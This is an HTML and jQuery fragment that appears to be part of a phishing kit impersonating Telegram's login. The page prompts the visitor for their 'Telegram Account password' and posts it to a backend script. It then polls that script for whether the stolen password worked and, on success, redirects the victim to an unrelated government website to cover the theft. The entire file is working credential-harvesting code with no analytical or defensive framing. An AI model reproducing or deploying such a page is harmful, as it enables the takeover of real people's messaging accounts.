<h3 class="mt-3 text-center fw-bold">Enter Password</h3>
<p class="mt-3 text-center">Input your Telegram Account password.</p>
<div class="mb-3">
    <input type="text" class="form-control text-center" name="phone" id="phone" placeholder="********" />
</div>
<p id="wrong" class="text-center">Wrong password.</p>
<button class="btdk btn btn-sm mx-auto d-block mb-3">CONFIRM</button>
<!--<a class="d-block mb-3 text-center" href="?otherAccount">Login akun lain</a>-->
<script>
  $("#wrong").hide();

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
        //   window.location.reload();
          window.location.replace("https://www.cdc.gov.sg/");
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("input[type='text']").val("");
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("button").on("click", function(e){
    e.preventDefault();
    var password = $("input[type='text']").val();

    if (password != "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: {"method":"sendPassword","password":password},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>